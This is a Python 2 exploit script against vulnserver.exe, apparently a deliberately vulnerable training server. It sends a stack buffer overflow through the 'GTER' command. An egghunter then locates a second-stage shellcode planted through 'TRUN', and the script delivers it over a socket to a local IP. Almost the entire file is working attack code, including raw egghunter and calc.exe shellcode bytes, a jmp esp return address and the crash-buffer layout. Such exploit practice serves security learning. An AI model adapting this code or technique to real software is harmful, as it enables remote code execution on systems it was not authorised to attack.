#!/usr/bin/python
#
# vulnserver.exe
# buffer overflow in the "GTER" command
# space for shellcode is very limited (~150 bytes before eip, ~20 bytes after eip)
# I use an egghunter to look for a bigger shellcode provided using the "TRUN", which is
# stored in memory first (malloc/free)
# I'm unable to get a reverse shell working, but exec/msgbox shellcodes work fine
#
# meik
#

import socket
import os
import sys
import struct

# egghunter will search for T00WT00W and jump right after it
egghunter = ("\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30"
"\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

# windows/exec calc.exe
calc = ("\xba\x48\x4a\xe2\x2c\xd9\xea\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x3e\x31\x50\x15\x83\xe8\xfc\x03\x50\x11\xe2\xbd\xf2\xd2\x58"
"\x90\x0b\xca\x44\x33\x7f\xc8\x72\x99\xb3\xd9\xca\x25\x85\x9b"
"\x3e\xd6\x27\x1f\x3c\xaa\xdd\x6f\xbf\x80\xa6\xe2\x05\x26\xf5"
"\x72\x61\x70\xb9\x0f\x53\xe1\x78\x3c\x9d\x7b\xe8\x97\x3a\x5d"
"\x15\xdf\x22\x0e\xf5\x19\x2b\x02\x59\xf6\x5e\xf3\x24\xe7\x06"
"\x96\x05\x76\x31\x53\x7c\x27\x9f\xe2\xef\x17\xd8\x80\x50\x3b"
"\x9d\x8c\x8a\x7c\xd5\x37\x39\xac\x1d\xcb\x14\x53\x24\xa7\x46"
"\x3c\xb2\xf0\xc4\x94\x52\x21\xa9\xc1\x94\xaf\xa7\x17\x69\x3e"
"\x75\xf6\x75\xfc\x35\x74\xa9\x0c\x3c\x1f\xb5\xe3\x78\x84\xd0"
"\xb4\x51\x10\x37\xb7\x47\x80\x4a\xcd\xb1\xd8\xae\x79\x56\xf9"
"\x7d\x4b\xb3\xdb\xae\x68\xd6\x29\xaa\xc5\x11\xba\xd6\x98\x42"
"\xb2\x25\x84\x73\x8e\x0c\xdf\xc7\xe5\x33\xb3\xd8\x86\x11\x0e"
"\xd9\x95\x65\xc7\x8c\x22\xf3\x9b\x24\xd0\xb4\x60\xf9\x21\xe3"
"\x0f\x27\x8f\x1e\x24\xb1\xa7\xbc\x85\x89\xe6\x3a\xe4\xdf\xe7"
"\x24\xe5\x11\xb0\x6e\x87\x6b\x4e\xc4\xdd\xbb\xf3\x4b\x21\x94"
"\x33\x0f\x9a\x7d\x02\x2f\xec\x68\x41\xd3\xb1\x7a\xed\xbf\x06"
"\x25\x3e\xc8\x35\x56\xe2\x92\xa5\xbe\x99\x36\x93\x07\x50\x84"
"\x3e\x38\x52\x2b")

# Second stage payload here with egg ("T00WT00W")
egg = "TRUN " + "." + "\x90" * 100 + "T00WT00W" + calc + "A" * 800

# Crash at 151 bytes actually
crash = "\x90" * (147 - len(egghunter) - 10)

# jmp esp address found in essfunc.dll
addr = struct.pack("<I", 0x62501203)

# that's our crash string :
# - GTER command + a few chars (actually, only a '.' is mandatory)
# - a few nops, then our egghunter
# - followed by a few more nops
# - then our EIP overwrite (jmp esp)
# - contents of ESP after crash (jump-back in order to land exactly on the egghunter)
# - and a few nops
buffer = "GTER /.:/" + crash + egghunter + "\x90" * 10 + addr + "\xeb\xd0" + "\x90" * 15

print "[*] Sending ..."
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.10.176", 9999))
print expl.recv(1024)
# We send our final shellcode first, as it will reside in a malloc()'ed area
expl.send(egg)
print "len: " + str(len(egg))
print expl.recv(1024)
# Then we send our crash string with our first stage payload
expl.send(buffer)
expl.close()
